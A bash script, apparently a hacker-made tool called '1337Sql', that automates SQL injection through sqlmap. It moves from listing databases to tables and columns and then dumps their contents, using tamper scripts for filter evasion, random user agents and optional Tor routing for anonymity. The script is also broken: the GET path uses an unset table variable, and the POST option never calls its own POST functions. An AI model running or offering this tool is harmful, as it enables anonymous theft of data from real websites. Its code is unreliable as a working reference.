#!/bin/bash
function about()
{
echo "######################################"
echo "#    WebSite: www.1337r00t.com       #"
echo "#         Coded : 1337r00t           #"
echo "######################################"
echo " "
}
##############################
#
# ./1337Sql -get [url]
#
##############################
function help()
{
        about
        echo "#~ How to use"
        echo " "

        echo "#~ Attacks via URL (Method GET):-"
        echo "#~ $0 -get"
        echo " "
        echo "#~ - Enabling TOR - [+]"
        echo "#~ $0 -get -tor"
        echo " "

        echo "#~ - Attacks through File with Request (Method POST):-"
        echo "#~ $0 -post"
        echo " "
        echo "#~ Enabling TOR [+]"
        echo "#~ $0 -post -tor"
        echo " "

        echo "#~ help [+]"
        echo "  $0 -h"
        exit
}

function error()
{
        echo "#~ Error 404 Syntax - [-]"
        echo " "
        help
}

function tamper()
{
        echo "$~ TAMPER()"
        ls -ah /usr/share/sqlmap/tamper/
        echo "#~ Which tamper method will be used"
        read tmpr
}

function t0r()
{
        echo "$~ TOR ENABLED()"
        echo "#~ Enter the URL to be browsed: "
        read url
        echo "#~ What variable will be used for The "
        read var
        tamper
        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs

        echo "#~ Enter the database to be Scanned "
        read db
        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables

        echo "#~ Enter the table to be scanned: "
        read tabela
        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela --columns

        echo "#~ Enter the column (s) to be explored (s) "
        read colunas
        sqlmap -u "$url" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela -C $colunas --dump
}

function get()
{
        echo "#~ Enter the URL to be browsed: "
        read url
        echo "#~ What variable will be used for The "
        read var
        tamper
        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var --dbs

        echo "#~ Enter the database to be Scanned "
        read db
        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var -D $db --tables

        echo "#~ Enter the table to be scanned: "
        read tabela
        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var -D $db -T $t4ble --columns

        echo "#~ Enter the column (s) to be explored (s) "
        read columns
        sqlmap -u "$url" --tamper="$tmpr" --random-agent -p $var -D $db -T $t4ble -C $columns --dump
}

function tor_post()
{
        echo "#~ TOR ENABLED - [+]"
        echo "#~ Enter the full path of the file with the request to be scanned:"
        read file
        echo "#~ What variable will be used for the :-"
        read var
        tamper
        sqlmap -r "$file" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs

        echo "#~ Enter the database to be scanned: "
        read db
        sqlmap -r "$file" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables
        echo "#~ Enter the table to be scanned: "
        read t4ble
        sqlmap -r "$file" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $t4ble --columns

        echo "#~ Enter the column (s) to be explored (s) "
        read columns
        sqlmap -r "$file" --tamper="$tmpr" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $t4ble -C $columns --dump
}

function post()
{
        echo "#~ Enter the full path of the file with the request to be scanned: "
        read file
        echo "#~ What variable will be used for the :-"
        read var
        tamper
        sqlmap -r "$file" --tamper="$tmpr" -p $var --dbs

        echo "#~ Enter the database to be scanned:"
        read db
        sqlmap -r "$file" --tamper="$tmpr" -p $var -D $db --tables
        echo "#~ Enter the table to be scanned:"
        read t4ble
        sqlmap -r "$file" --tamper="$tmpr" -p $var -D $db -T $t4ble --columns

        echo "#~ Enter the column (s) to be explored (s)"
        read columns
        sqlmap -r "$file" --tamper="$tmpr" -p $var -D $db -T $t4ble -C $columns --dump
}


if [ -z $1 ]
then
        error
fi

if [ $1 == '-h' ]
then
        help
fi

if [ $1 == '-get' ]
then
        if [ $2 == '-tor' ] 2> /dev/null
        then
                t0r
        else
                get
        fi
fi

if [ $1 == '-post' ]
then
        if [ $2 == '-tor' ] 2> /dev/null
        then
                t0r
        else
                get
        fi
else
        error
fi
